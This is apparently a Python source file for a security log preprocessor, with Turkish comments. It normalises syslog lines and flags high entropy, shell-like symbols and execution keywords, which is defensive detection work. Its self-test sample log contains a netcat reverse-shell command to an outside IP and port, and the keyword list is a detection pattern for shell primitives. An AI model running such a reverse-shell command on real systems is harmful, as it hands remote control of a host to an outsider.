# File: src/preprocessor.py
# Description: Production-Grade Parallel Text Preprocessor & Feature Normalizer
# Architecture: RegEx Token Substitution, Shannon Entropy Injection, Character N-Gram Cleaning

import re
import math
import numpy as np
from typing import List, Union, Dict, Any
from config.incident_config import config


def calculate_shannon_entropy(text: str) -> float:
    """
    Metnin Shannon Entropisini hesaplar.
    Yüksek entropi (> 4.2) gizlenmiş (obfuscated), Base64 veya Hex kodlanmış dinamik yükleri gösterir.
    """
    if not text:
        return 0.0
    entropy = 0.0
    text_len = len(text)
    # Karakter frekans hesabı
    for char in set(text):
        p_x = float(text.count(char)) / text_len
        entropy -= p_x * math.log2(p_x)
    return float(entropy)


class LogPreprocessor:
    """
    Gelen ham syslog verilerini gürültülerden temizler, sabit kalıpları (IP, Tarih, PID) 
    jenerik token'lar ile değiştirir ve entropi/sembol bayrakları enjekte eder.
    """
    def __init__(self):
        # Derlenmiş RegEx Desenleri (Yüksek İşlem Hızı İçin Pre-compiled)
        self.re_timestamp = re.compile(
            r'^[A-Za-z]{3}\s+\d+\s+\d+:\d+:\d+|^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]+[+-][0-9]{2}:[0-9]{2}'
        )
        self.re_ip = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
        self.re_pid = re.compile(r'\[\d+\]')
        self.re_hex = re.compile(r'0x[a-fA-F0-9]+')
        self.re_critical_symbols = re.compile(r'[\%\$\;\|\>\<\&\{\}\\\?\*]')
        self.re_exec_keywords = re.compile(
            r'(\bexec\b|\bcmd\b|\beval\b|\bspawn\b|\bsocket\b|\bpty\b|\bsystem\b|\bshell\b|\bpassthru\b|\bpopen\b)',
            re.IGNORECASE
        )

    def clean_single_log(self, raw_log: str) -> str:
        """
        Tek bir log satırını işler, temizler ve öznitelik bayraklarını ekler.
        """
        if not raw_log or not isinstance(raw_log, str):
            return "__EMPTY_LOG__"

        # 1. Başlık, Tarih ve Zaman Damgalarını Temizle
        clean_text = self.re_timestamp.sub('', raw_log).strip()

        # 2. IP Adreslerini Jenerik Token ile Değiştir
        clean_text = self.re_ip.sub('<IP>', clean_text)

        # 3. Process ID (PID) Bilgilerini Temizle
        clean_text = self.re_pid.sub('', clean_text)

        # 4. Hexadecimal Değerleri Temizle
        clean_text = self.re_hex.sub('<HEX>', clean_text)

        # 5. Metin İçi Kritik Sembol Sayısı ve Entropi Hesapla
        critical_symbol_count = len(self.re_critical_symbols.findall(clean_text))
        entropy_val = calculate_shannon_entropy(clean_text)

        # 6. Anomali ve İcra Bayraklarını (Feature Markers) Metne Enjekte Et
        flags = []
        if critical_symbol_count >= 4:
            flags.append("__HIGH_SYMBOL__")
        if entropy_val >= 4.1:
            flags.append("__HIGH_ENTROPY__")
        if self.re_exec_keywords.search(clean_text):
            flags.append("__EXEC_PATTERN__")

        # Temizlenmiş Metin + Enjekte Edilen Semantik Bayraklar
        if flags:
            clean_text = f"{clean_text} {' '.join(flags)}"

        return clean_text

    def transform_batch(self, raw_logs: List[str]) -> List[str]:
        """
        Toplu log listesini dönüştürür.
        """
        return [self.clean_single_log(log) for log in raw_logs]

    def extract_log_metadata(self, raw_log: str) -> Dict[str, Any]:
        """
        Gelen ham logdan ek metadata (IP, Hostname, Process Name, Entropi) çıkarır.
        """
        ip_matches = self.re_ip.findall(raw_log)
        entropy_score = calculate_shannon_entropy(raw_log)
        
        # Hostname yakalama denemesi
        host_match = re.search(r'\b(srv-[a-zA-Z0-9-]+|srv\d+)\b', raw_log)
        hostname = host_match.group(1) if host_match else "UNKNOWN_HOST"

        return {
            "raw_length": len(raw_log),
            "extracted_ips": ip_matches if ip_matches else ["N/A"],
            "hostname": hostname,
            "entropy": round(entropy_score, 4),
            "has_high_entropy": entropy_score >= 4.1
        }


# Modül Kullanım Testi ve Doğrulama
if __name__ == "__main__":
    preprocessor = LogPreprocessor()
    sample_raw = "Aug 13 12:00:11 srv-web-prod01 bash[30100]: Executed: /bin/nc -e /bin/bash 194.26.29.112 4444"
    
    cleaned = preprocessor.clean_single_log(sample_raw)
    metadata = preprocessor.extract_log_metadata(sample_raw)

    print("--- PREPROCESSOR VERIFICATION ---")
    print(f"RAW LOG   : {sample_raw}")
    print(f"CLEANED   : {cleaned}")
    print(f"METADATA  : {metadata}")